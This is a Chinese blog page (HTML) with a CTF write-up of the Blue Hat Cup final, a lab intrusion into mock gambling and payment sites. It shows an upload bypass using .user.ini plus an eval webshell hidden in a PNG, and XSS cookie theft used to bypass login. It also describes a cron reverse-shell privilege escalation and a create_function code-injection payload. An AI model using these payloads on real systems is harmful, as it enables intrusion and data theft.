@@ -1,0 +1,452 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="UTF-8" />
+        <title>蓝帽杯总决赛（含复现） | 雲流のLowest World</title>
+        <meta name="author" content="C1oudfL0w0" />
+        <meta name="description" content="" />
+        <meta name="keywords" content="" />
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+        <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+        <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入jQuery-->
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<!-- 引入不蒜子-->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    
+        <script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+    <meta name="generator" content="Hexo 6.3.0"></head>
+    <body>
+        <!--flag{never_g0nna g1ve_you up}-->
+
+        <!-- 页面点击小红心与文字 -->
+        <script type = "text/javascript" src = "/blog/js/love-click.js"></script>
+
+        <!-- 浏览器标题 -->
+         <script type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+         
+        <!--动态背景-->
+        <script type="text/javascript"
+        color="0,0,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+        <!--文章目录-->
+        
+    <div id="toc" class="toc-article">
+    <h3><i class="fa-brands fa-readme"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%95%E6%B5%81apk%E5%B9%B3%E5%8F%B0"><span class="toc-text">引流apk平台</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#apk%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="toc-text">apk反编译</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E6%9C%9F%E8%B5%84%E4%BA%A7%E6%90%9C%E9%9B%86"><span class="toc-text">前期资产搜集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%96%E7%BD%91"><span class="toc-text">外网</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%9A%E5%BD%A9%E7%BD%91%E7%AB%99%E4%B8%BB%E7%AB%99"><span class="toc-text">博彩网站主站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%9A%E5%BD%A9%E7%BD%91%E7%AB%99%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-text">博彩网站客服平台（复现）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xss"><span class="toc-text">xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0"><span class="toc-text">后台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpMyAdmin"><span class="toc-text">phpMyAdmin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-text">计划任务提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BC%98%E6%83%A0%E5%A4%A7%E5%8E%85%EF%BC%88%E6%9C%AA%E5%AE%8C%E6%88%90%EF%BC%89"><span class="toc-text">优惠大厅（未完成）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5"><span class="toc-text">前台sql注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E6%96%B9%E6%94%AF%E4%BB%98%E5%B9%B3%E5%8F%B0%EF%BC%88%E6%9C%AA%E5%AE%8C%E6%88%90%EF%BC%89"><span class="toc-text">四方支付平台（未完成）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#admin%E7%99%BB%E5%BD%95%E5%A4%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">admin登录处命令执行</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91"><span class="toc-text">内网</span></a></li></ol>
+    </div>
+  
+        
+        <!--返回顶部-->
+        <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+            <a title="返回顶部">↑</a>
+            </div>
+        <script src="/blog/js/totop.js"></script>
+
+        <div id="layout">
+            <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+            </transition>
+            <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>蓝帽杯总决赛（含复现）</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/10/29
+        </span>
+        
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">1.3k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">5分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>外网部分wp：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkwNzMzMjIyNg==&mid=2247487629&idx=1&sn=165f0a9bce082f1fa07395d2f34655fc&chksm=c0db8f60f7ac067682ddabde69e3808752869e70fa846a4767347c656d3b64a1f42d57b4cfb7&mpshare=1&scene=23&srcid=1103WWm0mjsJdkbSH2Px2WPk&sharer_shareinfo=4eb7941eb596bd0b0b178a9c08eb537d&sharer_shareinfo_first=82147f491273f56c11f4bf8f258cef85#rd">https://mp.weixin.qq.com/s?__biz=MzkwNzMzMjIyNg==&amp;mid=2247487629&amp;idx=1&amp;sn=165f0a9bce082f1fa07395d2f34655fc&amp;chksm=c0db8f60f7ac067682ddabde69e3808752869e70fa846a4767347c656d3b64a1f42d57b4cfb7&amp;mpshare=1&amp;scene=23&amp;srcid=1103WWm0mjsJdkbSH2Px2WPk&amp;sharer_shareinfo=4eb7941eb596bd0b0b178a9c08eb537d&amp;sharer_shareinfo_first=82147f491273f56c11f4bf8f258cef85#rd</a></p>
+<p>官方wp：<a target="_blank" rel="noopener" href="https://yhnx97pvjc.feishu.cn/file/FeMdbGcaTo9lqPx5nUicLl8Bngf">https://yhnx97pvjc.feishu.cn/file/FeMdbGcaTo9lqPx5nUicLl8Bngf</a></p>
+<p>抱歉，没能让出题人使出全力</p>
+<p>负责外网只打了个文件上传的我太菜了呜呜呜</p>
+<p>跟着官方wp做点补充复现，一些图会从官方wp里面copy过来补充</p>
+<p>官方的攻击路线图</p>
+<p><img src="/blog/2023/10/29/%E8%93%9D%E5%B8%BD%E6%9D%AF%E6%80%BB%E5%86%B3%E8%B5%9B%EF%BC%88%E5%90%AB%E5%A4%8D%E7%8E%B0%EF%BC%89/image-20231103205626521.png" alt="image-20231103205626521"></p>
+<span id="more"></span>
+
+<h1 id="引流apk平台"><a href="#引流apk平台" class="headerlink" title="引流apk平台"></a>引流apk平台</h1><p>dirsearch扫引流apk站点可以扫到&#x2F;flag路由，访问可以下载flag</p>
+<p>扫描二维码得到flag和apk文件下载地址</p>
+<p><img src="/blog/2023/10/29/%E8%93%9D%E5%B8%BD%E6%9D%AF%E6%80%BB%E5%86%B3%E8%B5%9B%EF%BC%88%E5%90%AB%E5%A4%8D%E7%8E%B0%EF%BC%89/image-20231029105507839.png" alt="image-20231029105507839"></p>
+<hr>
+<h1 id="apk反编译"><a href="#apk反编译" class="headerlink" title="apk反编译"></a>apk反编译</h1><p>下载并反编译apk文件，先全局搜索<code>flag&#123;</code>文本</p>
+<p><img src="/blog/2023/10/29/%E8%93%9D%E5%B8%BD%E6%9D%AF%E6%80%BB%E5%86%B3%E8%B5%9B%EF%BC%88%E5%90%AB%E5%A4%8D%E7%8E%B0%EF%BC%89/image-20231103204020642.png" alt="image-20231103204020642"></p>
+<p>除了那个假的flag还有一个flag是交不了的</p>
+<p>然后因为apk引流站点的ip为172.16.20.200，所以接下来全局搜索<code>172.16.</code>来找其他的目标ip</p>
+<p><img src="/blog/2023/10/29/%E8%93%9D%E5%B8%BD%E6%9D%AF%E6%80%BB%E5%86%B3%E8%B5%9B%EF%BC%88%E5%90%AB%E5%A4%8D%E7%8E%B0%EF%BC%89/image-20231029105333554.png" alt="image-20231029105333554"></p>
+<p>我这里只找到3个ip：172.16.200.123，172.16.1.123，172.16.10.102</p>
+<p>漏了一个贷款网站的ip，麻了</p>
+<p><img src="/blog/2023/10/29/%E8%93%9D%E5%B8%BD%E6%9D%AF%E6%80%BB%E5%86%B3%E8%B5%9B%EF%BC%88%E5%90%AB%E5%A4%8D%E7%8E%B0%EF%BC%89/image-20231103205033876.png" alt="image-20231103205033876"></p>
+<h1 id="前期资产搜集"><a href="#前期资产搜集" class="headerlink" title="前期资产搜集"></a>前期资产搜集</h1><p>fscan开扫</p>
+<p><img src="/blog/2023/10/29/%E8%93%9D%E5%B8%BD%E6%9D%AF%E6%80%BB%E5%86%B3%E8%B5%9B%EF%BC%88%E5%90%AB%E5%A4%8D%E7%8E%B0%EF%BC%89/image-20231029145805010.png" alt="image-20231029145805010"></p>
+<p>同时在博彩网站处发现在线客服平台也有自己的ip地址：172.16.15.200:48513</p>
+<hr>
+<h1 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h1><h2 id="博彩网站主站"><a href="#博彩网站主站" class="headerlink" title="博彩网站主站"></a>博彩网站主站</h2><blockquote>
+<p>文件上传</p>
+</blockquote>
+<p>反编译apk得到的靶标172.16.10.102是博彩网站主站</p>
+<p>注册并登录账户</p>
+<p>在会员中心 - 基本资料 - 上传身份证照片处发现png文件上传且路径可控</p>
+<p>测试发现安全狗过滤了php后缀，后端会检测文件头</p>
+<p>测试发现可以传.user.ini</p>
+<pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">GIF89a
+<span class="token key attr-name">auto_prepend_file</span><span class="token punctuation">=</span><span class="token value attr-value">1.png</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>上传一个1.png</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>这里试了半天，发现upload路径下居然有个index.php可以访问，于是蚁剑连</p>
+<p><img src="/blog/2023/10/29/%E8%93%9D%E5%B8%BD%E6%9D%AF%E6%80%BB%E5%86%B3%E8%B5%9B%EF%BC%88%E5%90%AB%E5%A4%8D%E7%8E%B0%EF%BC%89/image-20231029143953034.png" alt="image-20231029143953034"></p>
+<p>连上之后发现桌面有一个flag.txt，注：靶机是windows环境</p>
+<p><img src="/blog/2023/10/29/%E8%93%9D%E5%B8%BD%E6%9D%AF%E6%80%BB%E5%86%B3%E8%B5%9B%EF%BC%88%E5%90%AB%E5%A4%8D%E7%8E%B0%EF%BC%89/image-20231029144748685.png" alt="image-20231029144748685"></p>
+<p>在数据库连接文件db.php中找到第二个flag</p>
+<p><img src="/blog/2023/10/29/%E8%93%9D%E5%B8%BD%E6%9D%AF%E6%80%BB%E5%86%B3%E8%B5%9B%EF%BC%88%E5%90%AB%E5%A4%8D%E7%8E%B0%EF%BC%89/image-20231029150339247.png" alt="image-20231029150339247"></p>
+<hr>
+<h2 id="博彩网站客服平台（复现）"><a href="#博彩网站客服平台（复现）" class="headerlink" title="博彩网站客服平台（复现）"></a>博彩网站客服平台（复现）</h2><blockquote>
+<p>xss+后台任意文件读取</p>
+</blockquote>
+<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>博彩网站主站 - 在线客服</p>
+<p>这个xss没有任何过滤，但是我并不怎么熟悉xss，也没玩过xssbot，呜。。。</p>
+<p>新建项目并查看项目代码，姓名、email以及电话信息任意输入，在留言部分输入xss语句弹到xssbot，可以在xss平台中获取到cookie</p>
+<p><img src="/blog/2023/10/29/%E8%93%9D%E5%B8%BD%E6%9D%AF%E6%80%BB%E5%86%B3%E8%B5%9B%EF%BC%88%E5%90%AB%E5%A4%8D%E7%8E%B0%EF%BC%89/image-20231103211120014.png" alt="image-20231103211120014"></p>
+<hr>
+<h3 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h3><p>dirsearch扫的时候发现存在&#x2F;admin&#x2F;路由，访问进入管理员后台登录页面</p>
+<p>抓包，把刚才xss得到的cookie替换进去，可以实现绕过鉴权，进入WeLive后台，首页就存在flag</p>
+<p>同时存在任意文件读取的功能，读取<code>../config/config.php</code>得到配置文件</p>
+<p><img src="/blog/2023/10/29/%E8%93%9D%E5%B8%BD%E6%9D%AF%E6%80%BB%E5%86%B3%E8%B5%9B%EF%BC%88%E5%90%AB%E5%A4%8D%E7%8E%B0%EF%BC%89/image-20231103211544544.png" alt="image-20231103211544544"></p>
+<hr>
+<h3 id="phpMyAdmin"><a href="#phpMyAdmin" class="headerlink" title="phpMyAdmin"></a>phpMyAdmin</h3><p>fscan扫这个客服平台的端口</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fscan <span class="token parameter variable">-h</span> <span class="token number">172.16</span>.15.200<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>发现开放888端口</p>
+<p>访问，使用刚才配置文件中的得到的用户名密码进行登录，成功登录系统</p>
+<p>然后在sql功能处通过写文件的方式写入shell，注意shell的位置在48513端口下</p>
+<p>然后访问shell，先看看phpinfo，可以发现disable_functions里面禁用了大量命令执行的函数</p>
+<p>蚁剑连上shell，直接插件一把梭绕过</p>
+<hr>
+<h3 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h3><blockquote>
+<p>计划任务由crontab管理，非root用户是无法列出root用户的计划任务的，但可以列出&#x2F;etc&#x2F;crontab的系统任务，系统任务默认是以root权限运行的</p>
+</blockquote>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/crontab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>查看计划任务，发现root用户会定期执行&#x2F;tmp&#x2F;cleanup.py脚本</p>
+<p>上传cleanup.py到&#x2F;tmp并插入我们自己恶意的命令，如反弹shell</p>
+<p>从而实现提权</p>
+<hr>
+<h1 id="优惠大厅（未完成）"><a href="#优惠大厅（未完成）" class="headerlink" title="优惠大厅（未完成）"></a>优惠大厅（未完成）</h1><p>反编译apk得到靶标172.16.1.123，这个居然是优惠大厅。。。</p>
+<p><img src="/blog/2023/10/29/%E8%93%9D%E5%B8%BD%E6%9D%AF%E6%80%BB%E5%86%B3%E8%B5%9B%EF%BC%88%E5%90%AB%E5%A4%8D%E7%8E%B0%EF%BC%89/image-20231103213141689.png" alt="image-20231103213141689"></p>
+<h2 id="前台sql注入"><a href="#前台sql注入" class="headerlink" title="前台sql注入"></a>前台sql注入</h2><hr>
+<h1 id="四方支付平台（未完成）"><a href="#四方支付平台（未完成）" class="headerlink" title="四方支付平台（未完成）"></a>四方支付平台（未完成）</h1><p>反编译apk得到靶标172.16.200.123</p>
+<p>这题给了题目源码需要审计，测试的时候发现访问路由的首字母需要大写，通过大小写敏感可以确定是windows系统</p>
+<h2 id="admin登录处命令执行"><a href="#admin登录处命令执行" class="headerlink" title="admin登录处命令执行"></a>admin登录处命令执行</h2><p>说是登录处存在命令执行，原来是在admin的登录处存在命令执行，我在user那里审了半天。。。</p>
+<p>抓个登录的包，发现执行的路径在&#x2F;Admin&#x2F;Ajax.php下</p>
+<p>对应源码：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$act</span><span class="token operator">==</span><span class="token string single-quoted-string">'Login'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//登录后台</span>
+	<span class="token variable">$admin_user</span><span class="token operator">=</span><span class="token function">daddslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'admin_user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$admin_pass</span><span class="token operator">=</span><span class="token function">daddslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'admin_pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$user_pass</span><span class="token operator">=</span><span class="token variable">$admin_user</span><span class="token operator">.</span><span class="token string single-quoted-string">'and'</span><span class="token operator">.</span><span class="token variable">$admin_pass</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">;</span>
+	<span class="token variable">$user_pass_echo</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$username'</span><span class="token punctuation">,</span><span class="token variable">$user_pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$admin_user</span> <span class="token keyword">or</span> <span class="token operator">!</span><span class="token variable">$admin_pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+			<span class="token variable">$result</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token string double-quoted-string">"所有参数不能为空"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$admin_user</span><span class="token operator">==</span><span class="token variable">$conf</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'admin_user'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$admin_pass</span><span class="token operator">==</span><span class="token variable">$conf</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'admin_pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+			<span class="token variable">$session</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$admin_user</span><span class="token operator">.</span><span class="token variable">$admin_pass</span><span class="token operator">.</span><span class="token variable">$password_hash</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token variable">$token</span><span class="token operator">=</span><span class="token function">authcode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$user</span><span class="token punctuation">&#125;</span></span>\t<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$session</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ENCODE'</span><span class="token punctuation">,</span> <span class="token variable">$conf</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'KEY'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"admin_token"</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">604800</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token variable">$city</span><span class="token operator">=</span><span class="token function">get_ip_city</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Result'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Country'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+			<span class="token variable">$DB</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"insert into `pay_log` (`pid`,`type`,`date`,`ip`,`city`) values ('0','后台管理员登陆','"</span><span class="token operator">.</span><span class="token variable">$date</span><span class="token operator">.</span><span class="token string double-quoted-string">"','"</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token operator">.</span><span class="token string double-quoted-string">"','"</span><span class="token operator">.</span><span class="token variable">$city</span><span class="token operator">.</span><span class="token string double-quoted-string">"')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token variable">$result</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token string double-quoted-string">"登录成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$admin_user</span> <span class="token operator">!=</span> <span class="token variable">$conf</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'admin_user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+			<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass_error'</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>
+			<span class="token variable">$result</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token string double-quoted-string">"登录失败,账号错误"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$admin_pass</span> <span class="token operator">!=</span> <span class="token variable">$conf</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'admin_pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+			<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass_error'</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>
+			<span class="token variable">$result</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token string double-quoted-string">"登录失败,密码错误"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>一眼<code>create_function</code>存在命令执行，<code>$admin_user</code>和<code>$admin_pass</code>就是我们可控的用户名和密码，抓包传参命令执行</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http">POST admin_user=admin&amp;admin_pass=1;&#125;phpinfo();/*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/10/29/%E8%93%9D%E5%B8%BD%E6%9D%AF%E6%80%BB%E5%86%B3%E8%B5%9B%EF%BC%88%E5%90%AB%E5%A4%8D%E7%8E%B0%EF%BC%89/image-20231103214724432.png" alt="image-20231103214724432"></p>
+<hr>
